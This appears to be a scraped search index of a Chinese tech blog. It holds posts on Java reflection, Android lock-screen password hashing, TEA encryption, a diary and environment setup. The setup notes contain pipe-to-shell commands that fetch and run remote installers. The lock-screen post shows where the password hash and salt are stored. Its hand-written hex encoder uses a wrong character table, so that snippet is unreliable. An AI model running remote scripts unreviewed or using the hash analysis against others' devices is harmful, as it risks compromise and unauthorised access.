。\nJava实现的版本在初始化时需要较多时间，但长久来说性能较好；native版本正好相反，启动时相对较快，但运行时间长了之后速度就比不过Java版了\n为了尽可能地减少性能损耗，HotSpot JDK采用“inflation”的技巧：让Java方法在被反射调用时，开头若干次使用native版，等反射调用次数超过阈值时则生成一个专用的MethodAccessor实现类，生成其中的invoke()方法的字节码，以后对该Java方法的反射调用就会使用Java版本。 这项优化是从JDK 1.4开始的。\n在JVM层面探究invoke0方法\ninvoke0方法是一个native方法,它在HotSpot JVM里调用JVM_InvokeMethod函数:\n1 2 3 4 5 JNIEXPORT jobject JNICALL Java_sun_reflect_NativeMethodAccessorImpl_invoke0 (JNIEnv *env, jclass unused, jobject m, jobject obj, jobjectArray args) { return JVM_InvokeMethod(env, m, obj, args); } openjdk/hotspot/src/share/vm/prims/jvm.cpp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 JVM_ENTRY(jobject, JVM_InvokeMethod(JNIEnv *env, jobject method, jobject obj, jobjectArray args0)) JVMWrapper(\u0026#34;JVM_InvokeMethod\u0026#34;); Handle method_handle; if (thread-\u0026gt;stack_available((address) \u0026amp;method_handle) \u0026gt;= JVMInvokeMethodSlack) { method_handle = Handle(THREAD, JNIHandles::resolve(method)); Handle receiver(THREAD, JNIHandles::resolve(obj)); objArrayHandle args(THREAD, objArrayOop(JNIHandles::resolve(args0))); oop result = Reflection::invoke_method(method_handle(), receiver, args, CHECK_NULL); jobject res = JNIHandles::make_local(env, result); if (JvmtiExport::should_post_vm_object_alloc()) { oop ret_type = java_lang_reflect_Method::return_type(method_handle()); assert(ret_type != NULL, \u0026#34;sanity check: ret_type oop must not be NULL!\u0026#34;); if (java_lang_Class::is_primitive(ret_type)) { // Only for primitive type vm allocates memory for java object. // See box() method. JvmtiExport::post_vm_object_alloc(JavaThread::current(), result); } } return res; } else { THROW_0(vmSymbols::java_lang_StackOverflowError()); } JVM_END openjdk/hotspot/src/share/vm/runtime/reflection.cpp :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 oop Reflection::invoke_method(oop method_mirror, Handle receiver, objArrayHandle args, TRAPS) { oop mirror = java_lang_reflect_Method::clazz(method_mirror); int slot = java_lang_reflect_Method::slot(method_mirror); bool override = java_lang_reflect_Method::override(method_mirror) != 0; objArrayHandle ptypes(THREAD, objArrayOop(java_lang_reflect_Method::parameter_types(method_mirror))); oop return_type_mirror = java_lang_reflect_Method::return_type(method_mirror); BasicType rtype; if (java_lang_Class::is_primitive(return_type_mirror)) { rtype = basic_type_mirror_to_basic_type(return_type_mirror, CHECK_NULL); } else { rtype = T_OBJECT; } instanceKlassHandle klass(THREAD, java_lang_Class::as_Klass(mirror)); Method* m = klass-\u0026gt;method_with_idnum(slot); if (m == NULL) { THROW_MSG_0(vmSymbols::java_lang_InternalError(), \u0026#34;invoke\u0026#34;); } methodHandle method(THREAD, m); return invoke(klass, method, receiver, override, ptypes, rtype, args, true, THREAD); } Java版的实现\nJava版MethodAccessor的生成使用MethodAccessorGenerator实现 下面是开头的注释：\n1 2 3 4 5 6 7 /** Generator for sun.reflect.MethodAccessor and sun.reflect.ConstructorAccessor objects using bytecodes to implement reflection. A java.lang.reflect.Method or java.lang.reflect.Constructor object can delegate its invoke or newInstance method to an accessor using native code or to one generated by this class. (Methods and Constructors were merged together in this class to ensure maximum code sharing.) */ ","date":"2018-07-25T00:00:00+08:00","permalink":"https://ykiko.top/p/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"Java反射机制学习笔记"},{"content":"Android应用安全防护和逆向分析-基础篇1 第一章 Android中锁屏密码加密算法分析 1. 锁屏密码方式： 手势\n九宫格连线\n输入密码\n指纹、人脸、虹膜\n可穿戴设备\n2. 这儿分析手势密码和输入密码 找到android源代码中的LockPatternUtils,java 这个工具类\n路径：Android-5.1.1\\frameworks\\base\\core\\java\\com\\android\\internal\\widget\n2.1 输入密码算法分析 (5.1版本的源代码 和书上细微差异)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public byte[] passwordToHash(String password, int userId) {//参数为密码和对应用户ID 默认0 if (password == null) { return null; } try { byte[] saltedPassword = (password + getSalt(userId)).getBytes(); byte[] sha1 = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;).digest(saltedPassword); byte[] md5 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(saltedPassword); //首先让 password+salt值 再SHA-1和MD5 byte[] combined = new byte[sha1.length + md5.length]; System.arraycopy(sha1, 0, combined, 0, sha1.length); System.arraycopy(md5, 0, combined, sha1.length, md5.length); //装换成hex值 再拼接起来 final char[] hexEncoded = HexEncoding.encode(combined); return new String(hexEncoded).getBytes(StandardCharsets.UTF_8); } catch (NoSuchAlgorithmException e) { throw new AssertionError(\u0026#34;Missing digest algorithm: \u0026#34;, e); } } 如何获取设备对应的salt值：\n1 2 3 4 5 6 7 8 9 10 11 12 13 private String getSalt(int userId) { long salt = getLong(LOCK_PASSWORD_SALT_KEY, 0, userId); if (salt == 0) { //值为0 重新生成 try { salt = SecureRandom.getInstance(\u0026#34;SHA1PRNG\u0026#34;).nextLong(); setLong(LOCK_PASSWORD_SALT_KEY, salt, userId); //保存值 Log.v(TAG, \u0026#34;Initialized lock password salt for user: \u0026#34; + userId); } catch (NoSuchAlgorithmException e) { throw new IllegalStateException(\u0026#34;Couldn\u0026#39;t get SecureRandom number\u0026#34;, e); } } return Long.toHexString(salt); // hex之后返回 } 继续跟踪 看保存的地方\n1 2 3 4 5 6 7 private long getLong(String secureSettingKey, long defaultValue, int userHandle) { try { return getLockSettings().getLong(secureSettingKey, defaultValue, userHandle); } catch (RemoteException re) { return defaultValue; } } 继续跟踪代码\n1 2 3 4 5 6 7 8 9 @VisibleForTesting public ILockSettings getLockSettings() { if (mLockSettingsService == null) { ILockSettings service = ILockSettings.Stub.asInterface( ServiceManager.getService(\u0026#34;lock_settings\u0026#34;)); //获取服务来操作 mLockSettingsService = service; } return mLockSettingsService; } 在android中 这种获取服务的方式最终实现逻辑都是在XXXService类中\n这里在LockSettingService.java中 找到这个类的getLong方法\n1 2 3 4 5 public long getLong(String key, long defaultValue, int userId) { checkReadPermission(key, userId); String value = getStringUnchecked(key, null, userId); return TextUtils.isEmpty(value) ? defaultValue : Long.parseLong(value); } 保存在数据库？\n继续跟踪\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 static class Injector { protected Context mContext; public Injector(Context context) { mContext = context; } public Context getContext() { return mContext; } public Handler getHandler() { return new Handler(); } public LockSettingsStorage getStorage() { final LockSettingsStorage storage = new LockSettingsStorage(mContext); storage.setDatabaseOnCreateCallback(new LockSettingsStorage.Callback() { @Override public void initialize(SQLiteDatabase db) { // Get the lockscreen default from a system property, if available boolean lockScreenDisable = SystemProperties.getBoolean( \u0026#34;ro.lockscreen.disable.default\u0026#34;, false); if (lockScreenDisable) { storage.writeKeyValue(db, LockPatternUtils.DISABLE_LOCKSCREEN_KEY, \u0026#34;1\u0026#34;, 0); } } }); return storage; } public LockSettingsService(Context context) { this(new Injector(context)); } 继续 查看LockSettingsStorage.java 类中 存在数据库中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 static class DatabaseHelper extends SQLiteOpenHelper { private static final String TAG = \u0026#34;LockSettingsDB\u0026#34;; private static final String DATABASE_NAME = \u0026#34;locksettings.db\u0026#34;; private static final int DATABASE_VERSION = 2; private static final int IDLE_CONNECTION_TIMEOUT_MS = 30000; private Callback mCallback; public DatabaseHelper(Context context) { super(context, DATABASE_NAME, null, DATABASE_VERSION); setWriteAheadLoggingEnabled(true); // Memory optimization - close idle connections after 30s of inactivity setIdleConnectionTimeout(IDLE_CONNECTION_TIMEOUT_MS); } public void setCallback(Callback callback) { mCallback = callback; } private void createTable(SQLiteDatabase db) { db.execSQL(\u0026#34;CREATE TABLE \u0026#34; + TABLE + \u0026#34; (\u0026#34; + \u0026#34;_id INTEGER PRIMARY KEY AUTOINCREMENT,\u0026#34; + COLUMN_KEY + \u0026#34; TEXT,\u0026#34; + COLUMN_USERID + \u0026#34; INTEGER,\u0026#34; + COLUMN_VALUE + \u0026#34; TEXT\u0026#34; + \u0026#34;);\u0026#34;); } @Override public void onCreate(SQLiteDatabase db) { createTable(db); if (mCallback != null) { mCallback.initialize(db); } } @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int currentVersion) { int upgradeVersion = oldVersion; if (upgradeVersion == 1) { // Previously migrated lock screen widget settings. Now defunct. upgradeVersion = 2; } if (upgradeVersion != DATABASE_VERSION) { Log.w(TAG, \u0026#34;Failed to upgrade database!\u0026#34;); } } } 看到了数据库的名字叫作：locksettings.db 保存在了：\n1 2 3 4 5 6 7 8 private static final String SYSTEM_DIRECTORY = \u0026#34;/system/\u0026#34;; //目录 private static final String LOCK_PATTERN_FILE = \u0026#34;gatekeeper.pattern.key\u0026#34;; private static final String BASE_ZERO_LOCK_PATTERN_FILE = \u0026#34;gatekeeper.gesture.key\u0026#34;; private static final String LEGACY_LOCK_PATTERN_FILE = \u0026#34;gesture.key\u0026#34;; //key1 private static final String LOCK_PASSWORD_FILE = \u0026#34;gatekeeper.password.key\u0026#34;; private static final String LEGACY_LOCK_PASSWORD_FILE = \u0026#34;password.key\u0026#34;; //key2 private static final String CHILD_PROFILE_LOCK_FILE = \u0026#34;gatekeeper.profile.key\u0026#34;; private static final String SYNTHETIC_PASSWORD_DIRECTORY = \u0026#34;spblob/\u0026#34;; 数据库文件存在/data/system/locksetting.db\n测试 在/data/system/下看到password.key\n打开看看：\n手动简单实现加密算法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public byte[] passwordToHash(String password) { if (password == null) { return null; } byte [] hashed = null; try { byte[] saltedPassword = (password + SALT).getBytes(); //SALT 值从数据库中得到 拿到之后进行hex转换 byte[] sha1 = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;).digest(saltedPassword); byte[] md5 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(saltedPassword); hashed = (toHex(sha1)+toHex(md5)).getBytes(); } catch(Exception e){ } return hashed; } private static String toHex(byte[] ary){ final String hex = \u0026#34;102031398sjdfklaj\u0026#34;; String ret = \u0026#34;\u0026#34;; for(int i=0;i\u0026lt;ary.length;i++){ ret += hex.charAt((ary[i]\u0026gt;\u0026gt; 4)\u0026amp; 0xf); ret += hex.charAt(ary[i]\u0026amp; 0xf); } return ret; } SALT 的值可以从数据库中拿到 也可以利用反射获取\n总结：\n​ MD5(输的明文密码+设备的salt).hex+ SHA1(输的的明文密码+设备的salt值).hex\n2.2 手势密码分析\n大致同上\n3. 简要： ​ 九宫格团装化成字节数组-\u0026gt;sha1 加密 即可\n其实大致流程和分析输入密码差不多 保存到本地的目录/data/system/gesture.key 文件\n","date":"2018-07-02T17:33:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%871/","title":"Android应用安全防护和逆向分析-基础篇1"},{"content":"TEA加密与解密 TEA加密与解密 TEA算法由剑桥大学计算机实验室的David Wheeler和Roger Needham于1994年发明。它是一种分组密码算法，其明文密文块为64比特，密钥长度为128比特。TEA算法利用不断增加的Delta(黄金分割率)值作为变化，使得每轮的加密是不同，该加密算法的迭代次数可以改变，建议的迭代次数为32轮。\n在游戏项目中，一般需要对资源或数据进行加密保护，最简单高效的加密算法就是采用位与或之类的，但是比较容易被人分析出来。 TEA加密算法不但比较简单，而且有很强的抗差分分析能力，加密速度也比较快。可以根据项目需求设置加密轮数来增加加密强度。主要运用了移位和异或运算。密钥在加密过程中始终不变。\n差分分析是一种选择明文攻击，其基本思想是：通过分析特定明文差分对相对应密文差分影响来获得尽可能大的密钥。它可以用来攻击任何由迭代一个固定的轮函数的结构的密码以及很多分组密码（包括DES），它是由Biham和Shamir于1991年提出的选择明文攻击。\n加密核心函数\n1 void EncryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key){ unsigned int y = *firstChunk; unsigned int z = *secondChunk; unsigned int sum = 0; unsigned int delta = 0x9e3779b9; for (int i = 0; i \u0026lt; 8; i++) //8轮运算(需要对应下面的解密核心函数的轮数一样) { sum += delta; y += ((z \u0026lt;\u0026lt; 4) + key[0]) ^ (z + sum) ^ ((z \u0026gt;\u0026gt; 5) + key[1]); z += ((y \u0026lt;\u0026lt; 4) + key[2]) ^ (y + sum) ^ ((y \u0026gt;\u0026gt; 5) + key[3]); } *firstChunk = y; *secondChunk = z;} 算法使用了一个神秘常数δ作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但δ的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」–\u0026gt; delta = 0x9e3779b9;\n解密核心函数\n1 void DecryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key){ unsigned int sum = 0; unsigned int y = *firstChunk; unsigned int z = *secondChunk; unsigned int delta = 0x9e3779b9; sum = delta \u0026lt;\u0026lt; 3; //32轮运算，所以是2的5次方；16轮运算，所以是2的4次方；8轮运算，所以是2的3次方 for (int i = 0; i \u0026lt; 8; i++) //8轮运算 { z -= (y \u0026lt;\u0026lt; 4) + key[2] ^ y + sum ^ (y \u0026gt;\u0026gt; 5) + key[3]; y -= (z \u0026lt;\u0026lt; 4) + key[0] ^ z + sum ^ (z \u0026gt;\u0026gt; 5) + key[1]; sum -= delta; } *firstChunk = y; *secondChunk = z;} ","date":"2018-01-17T00:00:00+08:00","permalink":"https://ykiko.top/p/tea%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/","title":"TEA加密与解密"},{"content":"碎碎念 有时候想说点什么，但是不知道该如何表达。不知道是不是语言能力下降了，脑中词汇量越来越少。\n2021-12-15 最近身心俱疲，应该是因为熬夜的原因。\n记得了不等于学会了。\n\u0026ldquo;Knowledge is so precious thing, that it is not shameful to extract it from any source.\u0026rdquo; ——St. Thomas Aquinas, c. 1270.\n我明明有很多空余时间来学自己想学的内容的，但是时间都去哪儿了呢？\n我没有了“独立思考”的能力？很奇怪。\n记住知识和了解知识之间有什么区别？\n是应该从基础学习还是边选定目标深入研究边补充基础知识？\n是记忆里的问题的还是不够专一的问题，学过一遍过几天还是忘记。\n费曼学习法的一些小的备注\n确立目标\n理解月标\n输出\n回顾\n简化|\n思维模式的转变\n需要更多正反馈 尝试近期的一些目标\n完全深入了解ebpf\nRust开发学习\n山地自行车和跑步训练\n2022-07-12 心里难受\n2023-02-28 最近总是心不在焉的思考很多现实问题，\n接受现实\n很多问题一直以来自己的\n很多一直难以免得现实问题\n2023-08-26 | 想起了花，从小就爱花🌸。好久没买花了，今天路过花店，看到几束还未开放的。我想了想，直到现在，一共收到过三次花，第一次是和某人第一次见面时她带的一大捧全红的花(不记得花名)，她说这代表热烈的爱，第二次是1024某人淘宝给我买的干花。第三次是某人在我生日时给我送的亲手织的装饰花当做生日礼物。我记忆中就送过别人一次花，去见某人时，路过花店就挑了几支不同的花装成一束带了过去。\n2023-08-01 | 关于猫。这是我养的第三只猫，我叫它八条(现在听到我喊八条就喵喵叫)。\n2023-08-27 | 没日没夜的打博德之门3。\n2023-09-04 应该翻篇了吧！\n2023-09-10 我感觉我失去了创造力！\n2023-09-12 回忆录——去书店读书。回想起上次去书店读书，还是在北京的圣熙八号，店名叫什么已经记不清了。时常在这个书店等人一等就是三四个小时，能读完一本短篇小说，我记得读了好几本东野圭吾的推理小说，后来周末两人闲着没事也会直接在这里坐上一整天。\n2023-10-18 间接性有点动力。\n2023-12-20 最近工作麻木了，做的内容乱七八糟，完全学不到任何东西。\n","date":"2000-01-22T00:00:00+08:00","permalink":"https://ykiko.top/p/%E7%A2%8E%E7%A2%8E%E5%BF%B5/","title":"碎碎念"},{"content":"EnvRecord 用来不时记录平时所用环境配置，以及遇到的各种问题以及解决办法。主要是为了防丢失，以及总是和空气斗志斗勇。\nWin10 日常使用\nWSL 默认不是root 设置默认root用户。ubuntu config --default-user root\non my zsh 装上\n官方github\n需要先安装ZSH。\n安装on my zsh:\nvia curl：sh -c \u0026quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\u0026quot;\nvia wget: sh -c \u0026quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\u0026quot;\n然后配置喜欢的 插件+主题。vi ~/.zshrc 修改plugins属性\n必备插件git、autojump、zsh-autosuggestions。主题 经常使用ys\nGDB装上+pwndbg+peda+gef\nwsl的ubuntu不支持x86，所以主要只能调试x64的程序，而且可能会出现莫名其妙的错误。\n不过可以使用qemu来运行x86的程序，调试还是不行会出错。参考\n1 2 3 4 5 sudo apt update sudo apt install qemu-user-static sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic \u0026#39;\\x7fELF\\x01\\x01\\x01\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x03\\x00\\x01\\x00\\x00\\x00\u0026#39; --mask \u0026#39;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfc\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xf8\\xff\\xff\\xff\\xff\\xff\\xff\\xff\u0026#39; # 运行下面的一条命令就行跑x86 不过每次打开wsl都得运行一次，很麻烦，可以写脚本自动开启。 sudo service binfmt-support start pwndbg+peda+gef\n三个都可能用到，三个工具特性不一样。各有强项，所以三个都装，使用脚本gdb.sh启动选项\n安装pwndbg:\n1 2 3 git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh peda:\n1 2 git clone https://github.com/longld/peda.git ~/peda echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit gef:\n1 2 3 4 5 6 # via the install script $ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh # manually $ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py $ echo source ~/.gdbinit-gef.py \u0026gt;\u0026gt; ~/.gdbinit gdb.sh 把该文件放在/usr/local/sbin 参考\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #!/bin/bash function Mode_change { name=$1 gdbinitfile=~/.gdbinit#这个路径按照你的实际情况修改# gdbinitfile=/root/Desktop/mode#路径按照你的实际情况修改 peda=\u0026#34;source ~/peda/peda.py\u0026#34; gef=\u0026#34;source ~/.gdbinit-gef.py\u0026#34; pwndbg=\u0026#34;source /home/pwndbg/gdbinit.py\u0026#34; sign=$(cat $gdbinitfile | grep -n \u0026#34;#this place is controled by user\u0026#39;s shell\u0026#34;) #此处上面的查找内容要和你自己的保持一致 pattern=\u0026#34;:#this place is controled by user\u0026#39;s shell\u0026#34; number=${sign%$pattern} location=$[number+2] parameter_add=${location}i parameter_del=${location}d message=\u0026#34;TEST\u0026#34; if [ $name -eq \u0026#34;1\u0026#34; ];then sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $peda\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the peda!\\n\u0026#34; elif [ $name -eq \u0026#34;2\u0026#34; ];then sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $gef\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the gef!\\n\u0026#34; else sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $pwndbg\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the pwndbg!\\n\u0026#34; fi } echo -e \u0026#34;Please choose one mode of GDB?\\n1.peda 2.gef 3.pwndbg\u0026#34; read -p \u0026#34;Input your choice:\u0026#34; num if [ $num -eq \u0026#34;1\u0026#34; ];then Mode_change $num elif [ $num -eq \u0026#34;2\u0026#34; ];then Mode_change $num elif [ $num -eq \u0026#34;3\u0026#34; ];then Mode_change $num else echo -e \u0026#34;Error!\\nPleasse input right number!\u0026#34; fi gdb $1 $2 $3 $4 $5 $6 $7 $8 $9# r2全家桶 （逆向调试神器）\n1 2 3 git clone https://github.com/radare/radare2.git cd radare2 sys/install.sh#Install / Update gcc arm aarch aarch64\nsudo apt install gcc-arm-linux-gnueabi 使用命令arm-linux-gnueabi-gcc\nsudo apt install gcc-aarch64-linux-gnu 使用命令aarch64-linux-gnu-gcc\nclang+llvm\n方法一，手动编译安装，费时费力\n方法二 apt\n完整方法这个地址\n只写ubuntu 18,04\n编辑 /etc/apt/sources.list，添加源 1 2 3 4 5 6 7 8 9 # i386 not available deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic main # 7 deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main # 8 deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main 添加证书 1 2 wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key|sudo apt-key add - # Fingerprint: 6084 F3CF 814B 57C1 CF12 EFD5 15CF 4D18 AF4F 7421 安装 版本8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # LLVM apt-get install libllvm-8-ocaml-dev libllvm8 llvm-8 llvm-8-dev llvm-8-doc llvm-8-examples llvm-8-runtime # Clang and co apt-get install clang-8 clang-tools-8 clang-8-doc libclang-common-8-dev libclang-8-dev libclang1-8 clang-format-8 python-clang-8 # libfuzzer apt-get install libfuzzer-8-dev # lldb apt-get install lldb-8 # lld (linker) apt-get install lld-8 # libc++ apt-get install libc++-8-dev libc++abi-8-dev # OpenMP apt-get install libomp-8-dev python3+pip\napt install python3 python3-pip、python-pip\npython库\nfrida （hook) 同win下使用\npwntools (py2)\ngmpy2 (py2-3)\nr2Frida\nBrida\nvscode （666） 主要是各种插件\nzh-ch （汉化包）\nbackground （右下角小萌人）\ncmder** (Win下强大的终端工具)** 官网下载安装\n简单配置：\nwsl vim 无法使用上下左右键解决\npy2-py3 官网找想要的包下载，同时装两个版本。\n修改环境变量，日常使用py3,把py3的环境变量放在前面，去py2的安装目录复制一份python.exe 更名为python2.exe，就可以使用python2作为命令输入。\npip配置为国内源会快很多\nJava8+jdk最新 官网下载安装\n下个jdk最新版防止部分工具需要。\n可能有时候还需要配置环境变量JAVA_HOME为JDK路径。\nGolang 也是只需下载安装就ok.\nNodeJS 也是只需下载安装就ok. 推荐稳定版。\n会默认安装npm，然而下载速度实在太慢，使用淘宝镜像cnpm ,用法相同\nnpm install -g cnpm --registry=https://registry.npm.taobao.org\ngit 官网下载安装完事\nYarn 官网下载安装完事\nCMake 下载安装ok\nhugo (博客工具) 下载exe到本地，配置环境变量\nHaskell Stack 官方文档、win直接下载安装\nStartlsBack (win下的美化工具) 下载安装 配置底部透明和居中\nNotepad++ (轻便的编辑器) 下载安装\nAndroid SDK 配置 adb工具 在目录platform-tools\nemulator、monitor 在tools下\nNDK-build 在ndk-bundle\nflutter (Google 跨平台框架) 有官网了\n下载SDK-\u0026gt;配置环境变量 flutter\\bin 。添加名为”PUB_HOSTED_URL”和”FLUTTER_STORAGE_BASE_URL”的条目。\nAndorid Studio设置\n安装插件\nFlutter插件： 支持Flutter开发工作流 (运行、调试、热重载等).\nDart插件： 提供代码分析 (输入代码时进行验证、代码补全等).\nVScode设置\n安装插件\nflutter Genymotion+逍遥Android (Android 模拟器) 下载安装ok\nCUDA （N卡xxx) 根据自己的显卡官网下载包\n根据需求安装。\n有个坑，如果为pytorch 或TensorFlow做前提 先看看这两支持的版本再安装相应的版本。\npytorch 需求前置环境也得装好 官方有很方便的安装方法 根据不同平台和环境\nTensorFlow 前置环境查官网 1 2 3 4 5 # GPU版本 py3 pip3 install tensorflow-gpu# stable pip3 install tf-nightly-gpu# preview pip3 install tensorflow-gpu==2.0.0-alpha0##TensorFlow 2.0 Alpha# CPU 版本 pip3 install --user --upgrade tensorflow tensorflow - 仅支持 CPU 的最新稳定版（建议新手使用）\ntensorflow-gpu - 支持 GPU 的最新稳定版（适用于 Ubuntu 和 Windows）\ntf-nightly - 仅支持 CPU 的预览每夜版（不稳定）\ntf-nightly-gpu - 支持 GPU 的预览每夜版（不稳定，适用于 Ubuntu 和 Windows）\ntensorflow==2.0.0-alpha0 - 仅支持 CPU 的预览 TF 2.0 Alpha 版（不稳定）\ntensorflow-gpu==2.0.0-alpha0 - 支持 GPU 的预览 TF 2.0 Alpha 版（不稳定，Ubuntu 和 Windows）\nVMware pro （虚拟机） 装MacOS记录 VBox （虚拟机） 安装拓展包 Xshell、Xftp (free for Home/School) free 的要去官网下载 填写信息，邮箱打开链接下载。\nTeamViewer (远程连接) 各种IDE、集成环境 只记录 Visual Studio 2019\nPycharm\nIDEA\n微信web开发工具\nphpStudy\nAndroid Studio (风扇~~ ~~)\nOther 不做记录\nUbuntu 18.04 一般用来调代码。 大部分配置同上面WSL,只记录不做过多介绍\non my zsh gdb+pwndbg+peda+gef 美化 manjaro 很喜欢的Linux发行版。基于ArchLinux，软件多，好看又好用。\nMac m2 没法用 放弃 等等 ","date":"0001-01-01T00:00:00Z","permalink":"https://ykiko.top/p/envrecord/","title":"EnvRecord"}]